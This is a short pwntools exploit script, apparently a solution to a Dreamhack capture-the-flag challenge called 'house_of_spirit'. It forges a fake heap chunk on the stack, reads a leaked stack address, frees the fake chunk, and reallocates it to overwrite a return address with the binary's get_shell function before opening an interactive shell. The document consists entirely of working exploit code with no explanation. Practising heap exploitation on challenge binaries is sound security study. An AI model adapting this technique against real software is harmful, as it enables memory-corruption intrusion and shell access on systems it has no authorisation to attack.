from pwn import *
r = remote("host1.dreamhack.games", 21506)

#r = process("./house_of_spirit")
pause()
elf = ELF("./house_of_spirit")

fake_chunk = p64(0x0) + p64(0x60)

def malloc(size, data):
    print r.sendlineafter("> ", "1")
    print r.sendlineafter("Size: ", str(size))
    print r.sendlineafter("Data: ", data)

def free(addr):
    print r.sendlineafter("> ", "2")
    print r.sendlineafter("Addr: ", str(addr))

print r.sendlineafter("name: ", fake_chunk)
stack = (int(r.recv(14), 16))
r.info("stack : " + hex(stack))
free(stack + 0x10)

malloc(0x50, "a" * 40 + p64(elf.symbols['get_shell']))
r.interactive()
